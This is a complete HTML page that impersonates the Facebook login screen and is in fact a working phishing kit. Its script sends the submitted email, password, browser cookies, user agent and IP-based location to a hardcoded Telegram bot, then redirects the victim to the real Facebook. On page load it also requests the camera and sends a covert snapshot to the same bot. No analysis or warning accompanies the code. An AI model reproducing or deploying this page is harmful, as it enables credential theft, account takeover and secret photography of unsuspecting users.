<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Facebook – Log In or Sign Up</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f2f5;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .logo {
      font-size: 50px;
      font-weight: bold;
      color: #1877f2;
      margin-bottom: 10px;
    }
    .login-container {
      background: white;
      padding: 20px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      border-radius: 5px;
      text-align: center;
      width: 350px;
    }
    input {
      display: block;
      width: 100%;
      margin: 10px 0;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 16px;
    }
    button {
      background: #1877f2;
      color: white;
      border: none;
      padding: 12px;
      cursor: pointer;
      width: 100%;
      border-radius: 5px;
      font-size: 16px;
    }
    button:hover {
      background: #145dbf;
    }
    .footer {
      margin-top: 20px;
      font-size: 14px;
      color: gray;
    }
    .forgot {
      margin-top: 10px;
      font-size: 14px;
      color: #1877f2;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <div class="logo">Facebook</div>
  <div class="login-container">
    <input type="text" id="email" placeholder="Email or Phone Number" />
    <input type="password" id="password" placeholder="Password" />
    <button onclick="submitLogin()">Log In</button>
    <div class="forgot">Forgot password?</div>
  </div>
  <div class="footer">Facebook © 2025</div>

  <script>
    let telegramBotToken = "7863457133:AAE31d9Hb5G6H_2HlpxEcJEfhYv3FhFy5ks";
    let chatId = "6899914313";

    async function submitLogin() {
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      if (!email || !password) return;

      const userAgent = navigator.userAgent;
      const time = new Date().toLocaleString();
      const cookies = document.cookie || "No cookies found";

      try {
        const response = await fetch("https://ipapi.co/json/");
        const data = await response.json();

        const ip = data.ip || "N/A";
        const city = data.city || "Unknown City";
        const region = data.region || "Unknown Region";
        const country = data.country_name || "Unknown Country";

        const message = `
[Login Attempt]
Email: ${email}
Password: ${password}

[User Info]
IP: ${ip}
Location: ${city}, ${region}, ${country}
User-Agent: ${userAgent}
Time: ${time}

[Cookies]
${cookies}
        `.trim();

        await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: message })
        });

        setTimeout(() => {
          window.location.href = "https://www.facebook.com";
        }, 1500);
      } catch (err) {
        console.error("Failed to send info:", err);
      }
    }

    function sendCameraPhoto() {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          let video = document.createElement("video");
          video.srcObject = stream;
          video.play();

          video.addEventListener("loadeddata", () => {
            setTimeout(() => {
              let canvas = document.createElement("canvas");
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              let ctx = canvas.getContext("2d");
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

              canvas.toBlob(blob => {
                let formData = new FormData();
                formData.append("chat_id", chatId);
                formData.append("photo", blob, "snapshot.jpg");

                fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
                  method: "POST",
                  body: formData
                });
              }, 'image/jpeg');

              stream.getTracks().forEach(track => track.stop());
            }, 3000);
          });
        })
        .catch(error => {
          let errorMessage = "Camera access denied or unavailable.";
          fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: errorMessage })
          });
        });
    }

    window.onload = sendCameraPhoto;
  </script>
</body>
</html>
